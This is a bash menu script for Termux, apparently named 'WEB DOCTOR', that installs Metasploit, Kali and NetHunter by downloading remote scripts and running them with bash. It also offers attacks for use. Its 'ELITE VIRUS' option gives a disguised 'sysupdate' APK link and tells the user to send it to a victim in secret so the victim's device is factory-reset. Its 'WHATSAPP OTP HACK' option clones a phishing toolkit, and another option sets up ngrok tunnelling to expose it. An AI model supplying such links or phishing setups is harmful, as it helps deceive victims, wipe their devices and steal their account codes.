#!/bin/bash
clear
#dont copyright or mod this script
#shehan lahiru
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
pin='\033[36;1m' #pink
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning
echo
echo
figlet -f slant "W E B
       D O C T O R"|lolcat
sleep 1
clear
echo
echo $i"["$bi"¤"$i"]"$me"───────────────────────────────────────────"$i"["$bi"¤"$i"]"
echo $i" |"$cy"  WEB DOCTOR V1.4 UPDATE COMING UP 20/07/2020"$i"|"
echo $i" |"$me"─────────────────────────────────────────────"$i"|"
echo $i" |"$pu" FACEBOOK :"$ku" shehan lahiru"$i"                    |"
echo $i" |"$pu" Contack WhatsApp :"$ku" +94774593440"$i"             |"
echo $i"["$bi"¤"$i"]"$me"───────────────────────────────────────────"$i"["$bi"¤"$i"]"
sleep 2
echo $i" Enter"$me" y"
echo $i" exit"$me" n"
read -p "Enter (y/n)" pil
if [ $pil =  y ]
then
cd $HOME
cd web_doctor
python2 ps.py
fi
if [ $pil = n ]
then
echo $i" Thanks for using"
sleep 2
exit
fi
echo
echo
echo $pu"    ─────|─────────────────────────────|─────"
sleep 0.3
echo $i"         |"$me" 1"$i" |"$pu" METASPLOIT v6 INSTALL.  "$i"|"
sleep 0.3
echo $i"         |"$cy" 2"$i" |"$pin" METASPLOIT v9 INSTALL.  "$i"|"
sleep 0.3
echo $i"         |─────────────────────────────|"
sleep 0.3
echo $i"         |"$pu" 3"$i" |"$pin" INSTALL KALI LINUX.     "$i"|"
sleep 0.3
echo $i"         |"$purl" 4"$i" |"$bi" INSTALL UBUNTU.         "$i"|"
sleep 0.3
echo $i"         |"$me" 5"$i" |"$bi" I.. KALI NET HANTER.    "$i"|"
sleep 0.3
echo $i"         |─────────────────────────────|"
sleep 0.3
echo $i"         |"$ku" 6"$i" |"$bi" UNINSTALL UBUNTU.       "$i"|"
sleep 0.3
echo $i"         |"$i" 7"$i" |"$i" UNINSTALL KALI.         "$i"|"
sleep 0.3
echo $i"         |"$i" 8"$i" |"$pu" UNINSTALL NET HANTER    "$i"|"
sleep 0.3
echo $i"         |─────────────────────────────|"
sleep 0.3
echo $i"         |"$bi" 9"$i" |"$pur" INSTALL PKGS.           "$i"|"
sleep 0.3
echo $i"         |"$cy"10"$i" |"$pin" UPDATE.                 "$i"|"
sleep 0.3
echo $i"         |"$i"11"$i" |"$i" ELITE VIRUS.            "$i"|"
sleep 0.3
echo $i"         |─────────────────────────────|"
sleep 0.3
echo $i"         |"$me"12"$i" |"$pur" WHATSAPP OTP HACK.      "$i"|"
sleep 0.3
echo $i"         |"$bi"13"$bi" |"$bi" ngrok                   "$i"|"
echo $pu"    ─────|─────────────────────────────|─────"
echo $me"¦"
read -p" ¥øuř ©hôïç€ " pil

if [ $pil = 1 ]
then
clear
figlet -f slant "W A I T"|lolcat
sleep 1
apt-get update -y
apt-get upgrade -y
pkg install python2 -y
pkg install python -y
pkg install git -y
pip install --upgrade pip
pip install lolcat -y
pkg install nano -y
termux-setup-storage
pkg install wget -y
pkg install openssh -y
pkg install ruby -y
pkg install curl -y
curl -LO https://github.com/termux/termux-packages/files/3995119/metasploit_5.0.65-1_all.deb.gz
gunzip metasploit_5.0.65-1_all.deb.gz
dpkg -i metasploit_5.0.65-1_all.deb 
apt -f install -y
pkg install metasploit -y
apt --fix-broken install -y
dpkg --configure -a
sleep 2.0
echo $"unpacking..."
sleep 5.0
echo $"starting metasploit console"
sleep 2.0
msfconsole
fi

if [ $pil = 2 ]
then
clear
figlet -f slant "W A I T"|lolcat
sleep 1
pkg install unstable-repo
pkg install metasploit
echo $"successfuly installation"
echo $"run ./metasploit"
fi

if [ $pil = 3 ]
then
clear
figlet -f slant "W A I T"|lolcat
sleep 1
pkg install wget openssl-tool proot -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Kali/kali.sh && bash kali.sh
wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/SSH/Apt/ssh-apt.sh && bash ssh-apt.sh
fi

if [ $pil = 4 ]
then
clear
figlet -f slant "W A I T"|lolcat
sleep 1
pkg install wget openssl-tool proot -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Ubuntu/ubuntu.sh && bash ubuntu.sh
wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/SSH/Apt/ssh-apt.sh && bash ssh-apt.sh
fi

if [ $pil = 5 ]
then
clear
figlet -f slant "W A I T"|lolcat
sleep 1
pkg install wget openssl-tool proot -y && hash -r && wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Nethunter/nethunter.sh && bash nethunter.sh
fi

if [ $pil = 6 ]
then
clear
figlet -f slant "W A I T"|lolcat
sleep 1
wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Uninstaller/Ubuntu/UNI-ubuntu.sh && bash UNI-ubuntu.sh
fi

if [ $pil = 7 ]
then
clear
figlet -f slant "W A I T"|lolcat
sleep 1
wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Uninstaller/Nethunter/UNI-nethunter.sh && bash UNI-nethunter.sh
fi

if [ $pil = 8 ]
then
clear
figlet -f slant "W A I T"|lolcat
sleep 1
wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Uninstaller/Kali/UNI-kali.sh && bash UNI-kali.sh
fi

if [ $pil = 9 ]
then
clear
figlet -f slant "W A I T"|lolcat
sleep 1
apt update && apt upgrade
apt install python2 -y
pip2 install urllib3 chardet certifi idna requests
pkg install git -y
pip2 install mechanize -y
pkg install curl -y
pkg install ruby -y
pkg install gem -y
gem install lolcat -y
pkg install git -y
pkg install wget -y
pkg install php -y
pkg install ruby  -y
pkg cowsay  -y
pkg toilet  -y
pkg figlet -y
pkg install neofetch -y
pkg install nano -y
pkg install colorama -y
figlet -f slant "S U C C E S S F U L"|lolcat
fi

if [ $pil = 10 ]
then
clear
figlet -f slant "W A I T"|lolcat
sleep 1
cd $HOME
rm -rf web_doctor
git clone https://github.com/shehan-9909/web_doctor
cd web_doctor
chmod 777 setup.sh
./setup.sh
fi

if [ $pil = 11 ]
then
clear
figlet -f slant "W A I T"|lolcat
sleep 5
echo $i"BE CAREFULL ...harm your divice"
sleep 4.5
echo $pur"install apk this link"
sleep 5.8
echo $i"😈 Copy below link and send it your victim and
say nothing to him. when he install it in his
device it will be factory reset and lot more happens."
sleep 8
echo $pu"👇👇👇

L1NK :- https://rebrand.ly/sysupdate

👆👆👆"
echo $i"BE CAREFULL ...harm your divice"
fi

if [ $pil = 12 ]
then
clear
figlet -f slant "W A I T"|lolcat
git clone https://github.com/Ignitetch/AdvPhishing.git
echo $pur"Go to ngrok web...create a acount genarate a  ngrok token & ./instll.sh input ngrok token (./ngrok token)"
fi

if [ $pil = 13 ]
then
clear
figlet -f slant "W A I T"|lolcat
wget  https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
unzip ngrok-stable-linux-arm.zip
chmod 777 ngrok
echo $i"Enter ngrok auth hear (./ngrok autoken)"
fi


